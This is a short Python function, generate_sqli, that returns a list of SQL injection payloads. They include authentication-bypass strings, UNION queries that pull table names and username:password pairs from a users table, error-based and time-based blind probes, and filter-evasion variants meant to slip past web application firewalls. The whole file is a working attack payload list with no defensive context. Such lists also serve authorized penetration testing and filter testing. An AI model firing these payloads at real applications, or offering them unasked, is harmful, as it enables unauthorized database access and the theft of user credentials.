def generate_sqli():
    """
    Generates a list of SQL Injection payloads, including union-based, error-based, and blind techniques.
    """
    payloads = [
        # Basic SQLi payloads
        "' OR '1'='1",
        "' OR 1=1 -- -",
        "admin'--",

        # Union-based attacks
        "' UNION SELECT null, table_name FROM information_schema.tables -- -",
        "' UNION SELECT 1, concat(username, ':', password) FROM users -- -",

        # Error-based SQLi
        "' AND extractvalue(rand(), concat(0x3a, version())) -- -",
        "' AND updatexml(null, concat(0x3a, version()), null) -- -",

        # Blind SQLi
        "' AND SLEEP(5) -- -",
        "' AND IF(SUBSTRING(version(), 1, 1)='5', SLEEP(5), 1) -- -",

        # WAF bypass examples
        "UNION/*!50000SELECT*/ 1, 2",
        "id=1+UnIoN+SeLeCt+1,2",
        "1' /*!50000OR*/ '1'='1",
        "1' /*!50000OR*/ 1=1 -- -"
    ]
    return payloads
